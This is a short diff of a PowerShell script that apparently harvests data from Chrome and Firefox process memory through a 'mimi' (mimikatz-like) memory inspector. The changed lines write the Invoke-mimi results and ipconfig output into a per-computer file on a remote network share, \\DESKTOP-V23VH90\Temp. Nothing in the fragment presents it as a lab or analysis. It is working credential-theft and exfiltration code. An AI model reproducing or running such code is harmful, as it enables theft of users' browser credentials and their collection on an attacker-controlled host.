@@ -447,5 +447,6 @@ $matchesFound=[mimi.MemProcInspector]::InspectManyProcs("chrome","firefox")
 
 write-output $matchesFound
 }
-ipconfig > \\DESKTOP-V23VH90\Temp\$env:computername.txt
+echo "Start" > \\DESKTOP-V23VH90\Temp\$env:computername.txt
 Invoke-mimi  >> \\DESKTOP-V23VH90\Temp\$env:computername.txt
+ipconfig >> \\DESKTOP-V23VH90\Temp\$env:computername.txt
